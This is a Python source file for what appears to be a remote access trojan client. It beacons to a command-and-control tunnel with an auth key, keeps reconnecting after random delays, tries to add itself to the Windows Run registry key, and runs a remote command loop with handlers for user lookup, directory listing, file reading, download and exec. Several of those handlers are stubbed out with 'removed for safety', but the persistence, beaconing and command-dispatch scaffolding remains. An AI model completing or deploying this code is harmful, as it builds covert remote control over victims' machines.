import getpass
import socket
import random
import time
import subprocess
import platform
import winreg
import sys
import os
import urllib.request

PORT_URL = ""
TUNNEL_HOST = "127.0.0.1"
TUNNEL_PORT = 5050
KEY = "Nyx"


def get_tunnel_port():
    if PORT_URL:
        try:
            with urllib.request.urlopen(PORT_URL, timeout=10) as r:
                return int(r.read().decode().strip())
        except Exception:
            pass
    return TUNNEL_PORT

def send(msg):
    s.send(msg.encode("UTF-8"))

def add_to_startup():
    exe_path = sys.executable
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )
    winreg.CloseKey(key)

def getCommand():
    while True:
        msg = s.recv(4096)
        Command = msg.decode("UTF-8")

        if Command == "test":
            try:
                send("[OK]")
            except:
                pass

        elif Command == "getuser":
            try:
                s.send(getpass.getuser().encode())
            except:
                pass

        elif Command == "shutdown":
            try:
                send("Client shutting down.")
                s.shutdown(socket.SHUT_RDWR)
                s.close()
                break
            except:
                pass

        elif Command == "platform":
            try:
                send(platform.system())
            except:
                pass

        elif Command == "ls":
            cmd = "dir" if platform.system() == "Windows" else "ls"
            try:
                send("removed for safety")
            except:
                pass

        elif Command.startswith("cd "):
            try:
                send("removed for safety")
            except:
                pass

        elif Command.startswith("cat "):
            cmd = f"type {Command[4:]}" if platform.system() == "Windows" else f"cat {Command[4:]}"
            try:
                send("removed for safety")
            except:
                pass

        elif Command.startswith("download "):
            filepath = Command[9:].strip()
            filename = os.path.basename(filepath)
            try:
                send("removed for safety")
            except:
                pass

        elif Command.startswith("exec "):
            try:
                send("removed for safety")
            except:
                pass

        else:
            try:
                send('[?]')
            except:
                pass

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connected = False

while connected == False:
    try:
        port = get_tunnel_port()
        s.connect((TUNNEL_HOST, port))
        s.sendall(f"AUTH {KEY}\n".encode("utf-8"))
        connected = True
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sleepTime = random.randint(20, 30)
        time.sleep(sleepTime)

add_to_startup()
getCommand()
